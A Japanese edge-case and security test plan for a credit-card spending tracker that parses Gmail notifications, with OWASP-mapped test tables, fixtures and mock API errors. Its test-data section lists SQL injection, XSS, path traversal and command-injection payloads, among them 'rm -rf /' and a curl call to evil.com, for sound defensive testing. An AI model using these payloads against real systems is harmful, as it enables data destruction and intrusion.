# エッジケース・セキュリティテスト計画書

**プロジェクト**: card-spending-tracker
**バージョン**: 1.0.0
**作成日**: 2026-02-15
**担当**: 足軽4号（エッジケース・セキュリティ専門家)

---

## 目次

1. [概要](#1-概要)
2. [エッジケーステスト](#2-エッジケーステスト)
3. [セキュリティテスト](#3-セキュリティテスト)
4. [テストデータ準備方針](#4-テストデータ準備方針)
5. [実行順序と前提条件](#5-実行順序と前提条件)

---

## 1. 概要

### 1.1 目的

本計画書は、card-spending-tracker システムにおける**異常系・セキュリティリスク**を網羅的に検証するためのテストケースを定義する。正常系テストでは見落とされる「壊れ方のパターン」「攻撃パターン」を重点的に洗い出し、システムの堅牢性を保証する。

### 1.2 専門領域

- **不正フォーマット**: 壊れたHTML、文字化け、不正JSON、パース失敗
- **重複処理**: 同一メール複数取得、楽天カード速報版・確定版の重複
- **フィッシング対策**: 送信元ドメイン検証、偽装メール検知、セゾンカード詐欺メール
- **エラーリカバリー**: 部分的失敗時の挙動、リトライ戦略、トークン失効
- **セキュリティ**: SQLインジェクション、XSS、認証情報漏洩防止、OWASP Top 10

### 1.3 テスト階層分類

| 階層 | 説明 | 実施担当 |
|------|------|---------|
| **Unit** | 個別関数・モジュールの異常入力テスト | 足軽（本テスト） |
| **Integration** | コンポーネント間連携の異常系テスト | 足軽（本テスト） |
| **E2E** | システム全体での攻撃シナリオ検証 | 家老（別タスク） |

---

## 2. エッジケーステスト

### 2.1 テストケース一覧（異常系）

| テストID | 対象 | テストシナリオ | 期待される防御挙動 | 優先度 | テスト階層 |
|---------|------|--------------|-----------------|-------|----------|
| **T-EDGE-001** | メール解析 | HTMLタグ不完全（閉じタグなし） | パース失敗を検知、ログ記録、処理スキップ | **Critical** | Unit |
| **T-EDGE-002** | メール解析 | 文字エンコーディング異常（Shift-JIS → UTF-8誤変換） | 文字化け検知、警告ログ、部分的データ保存 | **High** | Unit |
| **T-EDGE-003** | メール解析 | UTF-8 BOM付きメール本文 | BOM除去後に正常パース | **Medium** | Unit |
| **T-EDGE-004** | メール解析 | 金額フィールド欠損（「利用金額」の記載なし） | NULLまたは0円として保存、`is_verified=0`フラグ設定 | **Critical** | Unit |
| **T-EDGE-005** | メール解析 | 日時フィールド欠損（「利用日」の記載なし） | パース失敗、該当メールをスキップ、ログ記録 | **Critical** | Unit |
| **T-EDGE-006** | メール解析 | 店舗名フィールド欠損 | `merchant=NULL`として保存（許容） | **Low** | Unit |
| **T-EDGE-007** | メール解析 | 金額に不正文字（"1,234X円"） | パース失敗、ログ記録、処理スキップ | **High** | Unit |
| **T-EDGE-008** | メール解析 | 金額が0円 | 正常データとして保存（エラーではない） | **Medium** | Unit |
| **T-EDGE-009** | メール解析 | 金額が負の値（"-1,234円"） | パース失敗またはエラーフラグ、ログ記録 | **High** | Unit |
| **T-EDGE-010** | メール解析 | 金額が極端に大きい（100億円超） | オーバーフロー防止、INT上限チェック、警告ログ | **High** | Unit |
| **T-EDGE-011** | メール解析 | 日時が未来の日付（2027年など） | 警告ログ記録、`is_verified=0`フラグ設定 | **Medium** | Unit |
| **T-EDGE-012** | メール解析 | 日時がうるう年境界値（2月29日/30日） | 正常パース（2/29は許容、2/30は拒否） | **Medium** | Unit |
| **T-EDGE-013** | メール解析 | 店舗名が異常に長い（1000文字超） | 切り捨てまたは長さ制限、警告ログ | **Low** | Unit |
| **T-EDGE-014** | メール解析 | 店舗名に特殊文字（改行、NULL文字、制御文字） | サニタイズ処理、危険文字除去 | **High** | Unit |
| **T-EDGE-015** | メール解析 | カード会社判別失敗（件名が未知パターン） | 不明カード会社として記録、`is_verified=0` | **Medium** | Unit |
| **T-EDGE-016** | メール解析 | 複数カード会社名が件名に混在 | 最初にマッチしたカード会社を採用、警告ログ | **Low** | Unit |
| **T-EDGE-017** | 重複処理 | 同一Gmail message IDを2回取得 | 2回目の挿入時にINTEGRITY ERRORでスキップ | **Critical** | Integration |
| **T-EDGE-018** | 重複処理 | 楽天カード速報版→確定版（金額異なる） | 速報版のみ保存、確定版はmessage ID重複でスキップ | **High** | Integration |
| **T-EDGE-019** | 重複処理 | 楽天カード速報版→確定版（金額同じ） | 速報版のみ保存、確定版はmessage ID重複でスキップ | **High** | Integration |
| **T-EDGE-020** | Gmail API | API レスポンスが空（`messages: []`） | 処理スキップ、ログに「新規メールなし」記録 | **Medium** | Integration |
| **T-EDGE-021** | Gmail API | ページネーション中にnextPageToken=null | ループ終了、取得済みメールのみ処理 | **Medium** | Integration |
| **T-EDGE-022** | Gmail API | メール本文取得時に404エラー（削除済み） | 該当メールをスキップ、ログ記録、次のメールへ | **Medium** | Integration |
| **T-EDGE-023** | Gmail API | 大量メール取得時のメモリ不足 | バッチ処理（100件ずつ）、メモリ使用量監視 | **High** | Integration |
| **T-EDGE-024** | DB保存 | SQLiteファイルが読み取り専用 | エラー検知、ユーザーに権限変更を促すエラーメッセージ | **High** | Integration |
| **T-EDGE-025** | DB保存 | ディスク容量不足 | 挿入失敗検知、明確なエラーメッセージ表示 | **High** | Integration |
| **T-EDGE-026** | DB保存 | トランザクション途中でクラッシュ | ロールバック保証、次回起動時に再試行 | **Medium** | Integration |
| **T-EDGE-027** | OAuth認証 | トークンファイルが破損（pickle読込失敗） | 再認証フロー開始、ユーザーにブラウザ認証を促す | **High** | Integration |
| **T-EDGE-028** | OAuth認証 | リフレッシュトークンが失効済み | RefreshError捕捉、再認証フロー開始 | **Critical** | Integration |
| **T-EDGE-029** | OAuth認証 | credentials.jsonが存在しない | 明確なエラーメッセージ、セットアップガイドへ誘導 | **High** | Integration |
| **T-EDGE-030** | 環境変数 | TOKEN_ENCRYPTION_KEYが未設定 | 暗号化失敗検知、環境変数設定を促すエラー | **High** | Integration |

---

## 3. セキュリティテスト

### 3.1 テストケース一覧（セキュリティ）

| テストID | 対象 | 攻撃シナリオ | 期待される防御挙動 | 優先度 | OWASP分類 |
|---------|------|------------|-----------------|-------|-----------|
| **T-SEC-001** | フィッシング対策 | 送信元が不正ドメイン（`@fake-vpass.ne.jp`） | ドメイン検証失敗、`is_verified=0`、警告ログ | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-002** | フィッシング対策 | セゾンカードからのメール（セゾンはメール送信しない） | 自動的にフィッシング判定、データ保存しない、警告ログ | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-003** | フィッシング対策 | 件名は正規、ドメインが不正（三井住友を騙る） | ドメインホワイトリストで検証、`is_verified=0` | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-004** | フィッシング対策 | 送信元アドレスのDisplay Name偽装 | Fromヘッダーのドメイン部のみ検証（Display Name無視） | **High** | A07:2021 認証の失敗 |
| **T-SEC-005** | SQLインジェクション | 店舗名に`'; DROP TABLE card_transactions;--`を含む | プレースホルダー使用、エスケープ処理、実行阻止 | **Critical** | A03:2021 インジェクション |
| **T-SEC-006** | SQLインジェクション | 店舗名に`' OR '1'='1`を含む | プレースホルダー使用、SQLとして実行されない | **Critical** | A03:2021 インジェクション |
| **T-SEC-007** | XSS（格納型） | 店舗名に`<script>alert('XSS')</script>`を含む | HTML出力時にエスケープ、スクリプト実行阻止 | **Critical** | A03:2021 インジェクション |
| **T-SEC-008** | XSS（格納型） | 店舗名に`<img src=x onerror=alert(1)>`を含む | HTML出力時にエスケープ、スクリプト実行阻止 | **Critical** | A03:2021 インジェクション |
| **T-SEC-009** | コマンドインジェクション | 店舗名に`; rm -rf /`を含む | コマンド実行機能なし（該当処理なし）、念のためログ監視 | **High** | A03:2021 インジェクション |
| **T-SEC-010** | パストラバーサル | Gmail message IDに`../../../etc/passwd`を含む | ファイル名サニタイズ、危険文字除去 | **High** | A01:2021 アクセス制御の不備 |
| **T-SEC-011** | 認証情報漏洩 | token.pickleファイルが平文で保存 | Fernet暗号化されている、平文保存されていない | **Critical** | A02:2021 暗号化の失敗 |
| **T-SEC-012** | 認証情報漏洩 | ログにOAuthトークンが出力 | トークンをログに出力しない、マスク処理 | **Critical** | A09:2021 セキュリティログの失敗 |
| **T-SEC-013** | 認証情報漏洩 | credentials.jsonが.gitignore対象外 | .gitignoreに含まれる、Gitにコミットされない | **Critical** | A05:2021 セキュリティ設定ミス |
| **T-SEC-014** | API レート制限 | 429エラー（Rate Limit Exceeded） | Exponential Backoff実装、2秒→4秒→8秒待機 | **High** | A04:2021 安全でない設計 |
| **T-SEC-015** | API レート制限 | 連続100回のAPI呼び出し | レート制限に到達しない、またはBackoffで回復 | **High** | A04:2021 安全でない設計 |
| **T-SEC-016** | 認証エラー | 401エラー（Unauthorized、トークン期限切れ） | 自動リフレッシュ実行、失敗時は再認証フロー | **Critical** | A07:2021 認証の失敗 |
| **T-SEC-017** | 認証エラー | 403エラー（Forbidden、スコープ不足） | エラーメッセージ表示、スコープ追加方法を案内 | **High** | A07:2021 認証の失敗 |
| **T-SEC-018** | CSRF | FastAPI `/api/sync`エンドポイントへの不正リクエスト | CSRF トークン検証（またはSameSite Cookie） | **High** | A01:2021 アクセス制御の不備 |
| **T-SEC-019** | DoS攻撃 | 極端に大きいHTML（10MB超のメール本文） | サイズ上限チェック、パース前にサイズ検証 | **Medium** | A04:2021 安全でない設計 |
| **T-SEC-020** | 正規表現DoS（ReDoS） | 正規表現に対する悪意のある入力（大量バックトラック） | タイムアウト設定、複雑度の低い正規表現使用 | **Medium** | A04:2021 安全でない設計 |
| **T-SEC-021** | 機密情報漏洩 | SQLiteファイルの権限が777（全ユーザー読取可能） | ファイル権限600推奨、Dockerコンテナ内で適切な権限設定 | **High** | A05:2021 セキュリティ設定ミス |
| **T-SEC-022** | 機密情報漏洩 | エラーメッセージに内部パスが含まれる | 本番環境でスタックトレース非表示、汎用エラーメッセージ | **Medium** | A09:2021 セキュリティログの失敗 |
| **T-SEC-023** | 中間者攻撃（MITM） | OAuth認証時のHTTP接続 | HTTPS強制、証明書検証 | **Critical** | A02:2021 暗号化の失敗 |
| **T-SEC-024** | トークン盗難 | token.pickleファイルが盗まれた場合 | 暗号化されているため、環境変数KEYなしでは復号不可 | **High** | A02:2021 暗号化の失敗 |
| **T-SEC-025** | 依存ライブラリ脆弱性 | google-api-python-clientに既知の脆弱性 | 定期的な依存関係更新、`poetry update`実施 | **Medium** | A06:2021 脆弱な古いコンポーネント |

---

## 4. テストデータ準備方針

### 4.1 エッジケーステストデータ

#### 4.1.1 不正フォーマットメール

```
tests/fixtures/edge_cases/
├── broken_html_unclosed_tags.eml         # T-EDGE-001
├── encoding_shiftjis_to_utf8.eml        # T-EDGE-002
├── utf8_bom.eml                         # T-EDGE-003
├── missing_amount_field.eml             # T-EDGE-004
├── missing_date_field.eml               # T-EDGE-005
├── missing_merchant_field.eml           # T-EDGE-006
├── invalid_amount_with_char.eml         # T-EDGE-007
├── zero_amount.eml                      # T-EDGE-008
├── negative_amount.eml                  # T-EDGE-009
├── huge_amount_overflow.eml             # T-EDGE-010
├── future_date.eml                      # T-EDGE-011
├── leap_year_boundary.eml               # T-EDGE-012
├── long_merchant_name.eml               # T-EDGE-013
├── merchant_with_special_chars.eml      # T-EDGE-014
├── unknown_card_company.eml             # T-EDGE-015
└── multiple_card_companies.eml          # T-EDGE-016
```

#### 4.1.2 重複テストデータ

```python
# T-EDGE-017: 同一message ID
duplicate_email = {
    "id": "msg_12345",
    "subject": "【楽天カード】カード利用のお知らせ",
    "from": "info@mail.rakuten-card.co.jp",
    "body": "利用金額: 1,234円"
}

# T-EDGE-018: 楽天速報版→確定版（金額異なる）
rakuten_preliminary = {
    "id": "msg_rakuten_001",
    "subject": "【楽天カード】カード利用のお知らせ（速報）",
    "body": "利用金額: 1,200円"  # 速報版
}
rakuten_final = {
    "id": "msg_rakuten_001",  # 同じID
    "subject": "【楽天カード】カード利用のお知らせ（確定）",
    "body": "利用金額: 1,234円"  # 確定版
}
```

### 4.2 セキュリティテストデータ

#### 4.2.1 フィッシングメールサンプル

```
tests/fixtures/security/phishing/
├── fake_domain_smbc.eml                 # T-SEC-001: @fake-vpass.ne.jp
├── saison_phishing.eml                  # T-SEC-002: セゾンカード詐欺
├── domain_mismatch.eml                  # T-SEC-003: 件名正規、ドメイン不正
└── display_name_spoofing.eml            # T-SEC-004: Display Name偽装
```

**サンプル（T-SEC-002）**:
```
From: セゾンカード <fake@saison-phishing.com>
Subject: 【セゾンカード】カードご利用のお知らせ
Date: 2026-02-15 10:00:00

利用金額: 50,000円
利用日: 2026/02/15 09:30
ご利用先店名: 不正業者

※ セゾンカードは利用通知メールを送信しない（アプリのみ）
→ このメールは100%フィッシング
```

#### 4.2.2 インジェクション攻撃パターン

```python
# T-SEC-005: SQLインジェクション
sql_injection_patterns = [
    "'; DROP TABLE card_transactions;--",
    "' OR '1'='1",
    "1' UNION SELECT * FROM card_transactions--",
    "'; DELETE FROM card_transactions WHERE '1'='1",
]

# T-SEC-007/008: XSS攻撃
xss_patterns = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
]

# T-SEC-009: コマンドインジェクション
command_injection_patterns = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "`whoami`",
    "$(curl http://evil.com)",
]

# T-SEC-010: パストラバーサル
path_traversal_patterns = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "/etc/shadow",
]
```

#### 4.2.3 境界値テストデータ

```python
boundary_test_cases = {
    "amount": [
        0,                    # T-EDGE-008: 最小値
        2147483647,           # T-EDGE-010: INT最大値
        -1,                   # T-EDGE-009: 負の値（不正）
        999999999999,         # T-EDGE-010: オーバーフロー
    ],
    "merchant_name": [
        "A" * 1000,           # T-EDGE-013: 長い店舗名
        "店舗\x00名",         # T-EDGE-014: NULL文字
        "店舗\n名",           # T-EDGE-014: 改行
        "店舗\r\n名",         # T-EDGE-014: CRLF
    ],
    "date": [
        "2026-02-29",         # T-EDGE-012: うるう年（2026年は平年→不正）
        "2024-02-29",         # T-EDGE-012: うるう年（2024年は閏年→正常）
        "2027-12-31",         # T-EDGE-011: 未来日付
        "1970-01-01",         # 境界値: UNIX epoch
    ]
}
```

### 4.3 モックオブジェクト

#### 4.3.1 Gmail API エラーレスポンス

```python
from googleapiclient.errors import HttpError

# T-SEC-014: 429 Rate Limit
mock_429_error = HttpError(
    resp=Mock(status=429),
    content=b'{"error": {"code": 429, "message": "Rate Limit Exceeded"}}'
)

# T-SEC-016: 401 Unauthorized
mock_401_error = HttpError(
    resp=Mock(status=401),
    content=b'{"error": {"code": 401, "message": "Invalid Credentials"}}'
)

# T-SEC-017: 403 Forbidden
mock_403_error = HttpError(
    resp=Mock(status=403),
    content=b'{"error": {"code": 403, "message": "Insufficient Permission"}}'
)

# T-EDGE-022: 404 Not Found
mock_404_error = HttpError(
    resp=Mock(status=404),
    content=b'{"error": {"code": 404, "message": "Message not found"}}'
)
```

---

## 5. 実行順序と前提条件

### 5.1 テスト実行順序

```
Phase 1: ユニットテスト（単体）
  → T-EDGE-001〜016（メール解析の異常系）
  → T-SEC-005〜010（インジェクション攻撃）

Phase 2: 統合テスト（コンポーネント連携）
  → T-EDGE-017〜030（Gmail API、DB、OAuth）
  → T-SEC-001〜004（フィッシング対策）
  → T-SEC-011〜025（認証、API、CSRF、DoS）

Phase 3: E2Eテスト（全体シナリオ）
  → 家老が担当（本計画書の対象外）
```

### 5.2 前提条件チェックリスト

| 前提条件 | 確認方法 | 満たせない場合の対処 |
|---------|---------|------------------|
| **Pythonバージョン 3.11+** | `python --version` | バージョンアップまたはpyenv使用 |
| **poetryインストール済み** | `poetry --version` | 公式手順でインストール |
| **依存ライブラリインストール済み** | `poetry install` | 事前実行 |
| **pytestインストール済み** | `pytest --version` | `poetry add --dev pytest` |
| **テストフィクスチャ配置済み** | `tests/fixtures/`の存在確認 | テストデータ準備スクリプト実行 |
| **SQLiteファイル書込権限** | `touch data/test.db && rm data/test.db` | 権限変更 `chmod 755 data/` |
| **環境変数設定** | `.env`ファイル存在確認 | `.env.example`をコピー |

### 5.3 SKIP判定条件

**以下の場合、テストをSKIPしてはならない（SKIP = FAIL扱い）**:
- 前提条件が満たせないが、対処可能な場合（ライブラリ未インストールなど）
- テストデータ準備が未完了の場合

**SKIPが許容されるケース**:
- Gmail API本番環境へのアクセスが必要だが、CI環境でクレデンシャルが利用不可（モックで代替推奨）
- Docker環境が必須だが、ローカル環境のみで実行（環境依存テスト）

---

## 付録A: OWASP Top 10 対応マトリックス

| OWASP分類 | 該当テストID | カバー率 |
|-----------|------------|---------|
| **A01:2021 アクセス制御の不備** | T-SEC-010, T-SEC-018 | 2件 |
| **A02:2021 暗号化の失敗** | T-SEC-011, T-SEC-023, T-SEC-024 | 3件 |
| **A03:2021 インジェクション** | T-SEC-005〜009 | 5件 |
| **A04:2021 安全でない設計** | T-SEC-014, T-SEC-015, T-SEC-019, T-SEC-020 | 4件 |
| **A05:2021 セキュリティ設定ミス** | T-SEC-013, T-SEC-021 | 2件 |
| **A06:2021 脆弱な古いコンポーネント** | T-SEC-025 | 1件 |
| **A07:2021 認証の失敗** | T-SEC-001〜004, T-SEC-016, T-SEC-017 | 6件 |
| **A09:2021 セキュリティログの失敗** | T-SEC-012, T-SEC-022 | 2件 |

**カバレッジ**: OWASP Top 10のうち8項目をカバー（未カバー: A08 ソフトウェアとデータの整合性、A10 サーバサイドリクエストフォージェリ）

---

## 付録B: リスク評価マトリックス

| リスク種別 | 発生確率 | 影響度 | リスクレベル | 軽減テスト |
|-----------|---------|-------|------------|-----------|
| **フィッシングメール誤検知** | 高 | 高 | **Critical** | T-SEC-001〜004 |
| **SQLインジェクション攻撃** | 中 | 高 | **High** | T-SEC-005, T-SEC-006 |
| **XSS攻撃** | 中 | 高 | **High** | T-SEC-007, T-SEC-008 |
| **OAuth トークン漏洩** | 低 | 高 | **High** | T-SEC-011, T-SEC-012, T-SEC-024 |
| **楽天カード重複メール** | 高 | 中 | **Medium** | T-EDGE-018, T-EDGE-019 |
| **メール形式変更によるパース失敗** | 中 | 中 | **Medium** | T-EDGE-001〜007 |
| **Gmail APIレート制限到達** | 低 | 中 | **Medium** | T-SEC-014, T-SEC-015 |
| **文字エンコーディング異常** | 中 | 低 | **Low** | T-EDGE-002, T-EDGE-003 |

---

**策定完了日時**: 2026-02-15
**次のアクション**: テストコード実装フェーズ（別タスク）
